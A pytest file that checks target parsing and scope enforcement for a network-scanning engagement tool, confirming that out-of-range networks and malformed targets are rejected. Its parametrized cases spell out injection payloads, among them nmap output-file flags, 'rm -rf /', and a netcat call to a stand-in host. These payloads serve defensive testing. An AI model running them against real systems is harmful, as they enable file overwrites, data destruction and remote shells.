"""Tests for engagement scope enforcement.

These are the tests that matter most in the codebase: every one of them
describes a way the previous generation of this tool could be made to run a
command it should not have, or to touch a network it was not authorised to
touch.
"""

from __future__ import annotations

import ipaddress

import pytest

from apps.engagements import scope

ALLOWED = [ipaddress.ip_network("10.4.0.0/16"), ipaddress.ip_network("192.168.50.0/24")]


# ── Argument injection ──────────────────────────────────────────────────
#
# The v2 bug: `ScanRequest.target` was appended verbatim to an nmap argv, so a
# leading dash turned a "target" into an nmap flag. `-oN <path>` made nmap write
# an attacker-chosen file, as root, from an unauthenticated endpoint.


@pytest.mark.parametrize(
    "payload",
    [
        "-oN /etc/cron.d/pwn",
        "-oG /tmp/out",
        "--script=/tmp/evil.nse",
        "-iL /etc/passwd",
        "--datadir=/tmp",
        "-",
    ],
)
def test_flag_shaped_targets_are_rejected(payload):
    with pytest.raises(scope.TargetSyntaxError, match="may not start with '-'"):
        scope.parse_network(payload)
    with pytest.raises(scope.TargetSyntaxError, match="may not start with '-'"):
        scope.parse_host(payload)


@pytest.mark.parametrize(
    "payload",
    [
        "10.4.0.1; rm -rf /",
        "10.4.0.1 && curl evil.example",
        "10.4.0.1|nc evil.example 4444",
        "$(whoami)",
        "`id`",
        "10.4.0.1\nnmap evil.example",
        "10.4.0.1\t-oN /tmp/x",
    ],
)
def test_shell_metacharacters_are_rejected(payload):
    """Nothing is executed through a shell, but these must still never parse."""
    with pytest.raises(scope.TargetSyntaxError):
        scope.parse_host(payload)


def test_empty_and_oversized_targets_are_rejected():
    with pytest.raises(scope.TargetSyntaxError, match="cannot be empty"):
        scope.parse_network("   ")
    with pytest.raises(scope.TargetSyntaxError, match="longer than"):
        scope.parse_host("a" * (scope.MAX_TARGET_LENGTH + 1))


def test_non_string_target_is_rejected():
    with pytest.raises(scope.TargetSyntaxError, match="must be a string"):
        scope.parse_network(12345)  # type: ignore[arg-type]


# ── Parsing ─────────────────────────────────────────────────────────────


def test_bare_address_parses_as_host_network():
    assert scope.parse_network("10.4.1.7") == ipaddress.ip_network("10.4.1.7/32")


def test_cidr_with_host_bits_is_normalised():
    """10.4.1.7/24 is accepted and normalised rather than rejected."""
    assert scope.parse_network("10.4.1.7/24") == ipaddress.ip_network("10.4.1.0/24")


def test_ipv6_is_supported():
    assert scope.parse_network("2001:db8::/32") == ipaddress.ip_network("2001:db8::/32")
    assert scope.parse_address("2001:db8::1") == ipaddress.ip_address("2001:db8::1")


@pytest.mark.parametrize("payload", ["10.4.0.1-50", "10.4.0.*", "10.4.0.0/33", "999.1.1.1"])
def test_nmap_range_and_glob_syntax_is_rejected(payload):
    """These are valid nmap targets but cannot be represented as a network.

    Accepting them would mean passing an unparsed string to the command line,
    which is exactly the class of bug this module exists to prevent.
    """
    with pytest.raises(scope.TargetSyntaxError):
        scope.parse_network(payload)


def test_hostname_is_accepted_and_normalised():
    assert scope.parse_host("Jump-Host.Corp.Local.") == "jump-host.corp.local"


@pytest.mark.parametrize("payload", ["-host.local", "host-.local", "ho st.local", "host..local"])
def test_malformed_hostnames_are_rejected(payload):
    with pytest.raises(scope.TargetSyntaxError):
        scope.parse_host(payload)


def test_parse_address_rejects_networks_and_names():
    with pytest.raises(scope.TargetSyntaxError):
        scope.parse_address("10.4.0.0/24")
    with pytest.raises(scope.TargetSyntaxError):
        scope.parse_address("jump.corp.local")


# ── Containment ─────────────────────────────────────────────────────────


def test_address_inside_allowed_range_passes():
    assert scope.assert_network_in_scope("10.4.1.7", ALLOWED) == ipaddress.ip_network(
        "10.4.1.7/32"
    )


def test_subnet_of_allowed_range_passes():
    assert scope.assert_network_in_scope("10.4.9.0/24", ALLOWED) == ipaddress.ip_network(
        "10.4.9.0/24"
    )


def test_address_outside_allowed_range_is_denied():
    with pytest.raises(scope.OutOfScope, match="not fully contained"):
        scope.assert_network_in_scope("10.5.0.1", ALLOWED)


def test_supernet_of_allowed_range_is_denied():
    """A /8 is not authorised just because a /16 inside it is.

    Partial overlap must fail closed — otherwise "scan 10.0.0.0/8" would be
    permitted by an allowance of 10.4.0.0/16 and would sweep the client's entire
    private space.
    """
    with pytest.raises(scope.OutOfScope):
        scope.assert_network_in_scope("10.0.0.0/8", ALLOWED)


def test_overlapping_but_not_contained_range_is_denied():
    with pytest.raises(scope.OutOfScope):
        scope.assert_network_in_scope("10.4.0.0/15", ALLOWED)


def test_empty_allowlist_denies_everything():
    """A newly created engagement is inert until someone widens it deliberately."""
    with pytest.raises(scope.OutOfScope, match="no authorised ranges"):
        scope.assert_network_in_scope("10.4.1.7", [])


def test_ipv4_target_is_not_matched_against_ipv6_allowance():
    allowed_v6 = [ipaddress.ip_network("2001:db8::/32")]
    with pytest.raises(scope.OutOfScope):
        scope.assert_network_in_scope("10.4.1.7", allowed_v6)


def test_is_within_accepts_exact_range_match():
    assert scope.is_within(ipaddress.ip_network("10.4.0.0/16"), ALLOWED)


# ── Hostname scope checks ───────────────────────────────────────────────


def test_hostname_in_scope_when_every_answer_is_allowed(monkeypatch):
    monkeypatch.setattr(
        scope,
        "resolve_host",
        lambda name: [ipaddress.ip_address("10.4.1.7"), ipaddress.ip_address("10.4.1.8")],
    )
    assert scope.assert_host_in_scope("jump.corp.local", ALLOWED) == "jump.corp.local"


def test_hostname_denied_when_any_answer_is_outside(monkeypatch):
    """One out-of-scope answer rejects the whole name — no partial allowance."""
    monkeypatch.setattr(
        scope,
        "resolve_host",
        lambda name: [ipaddress.ip_address("10.4.1.7"), ipaddress.ip_address("8.8.8.8")],
    )
    with pytest.raises(scope.OutOfScope, match="8.8.8.8"):
        scope.assert_host_in_scope("jump.corp.local", ALLOWED)


def test_hostname_denied_when_resolution_is_disabled():
    with pytest.raises(scope.OutOfScope, match="without DNS resolution"):
        scope.assert_host_in_scope("jump.corp.local", ALLOWED, resolve=False)


def test_literal_address_is_scope_checked_without_dns(monkeypatch):
    def explode(name):  # pragma: no cover - must never be called
        raise AssertionError("resolve_host must not be called for a literal address")

    monkeypatch.setattr(scope, "resolve_host", explode)
    assert scope.assert_host_in_scope("10.4.1.7", ALLOWED) == ipaddress.ip_address("10.4.1.7")


def test_networks_from_strings_rejects_the_whole_list_on_one_bad_entry():
    with pytest.raises(scope.TargetSyntaxError):
        scope.networks_from_strings(["10.4.0.0/16", "not-a-network/24"])
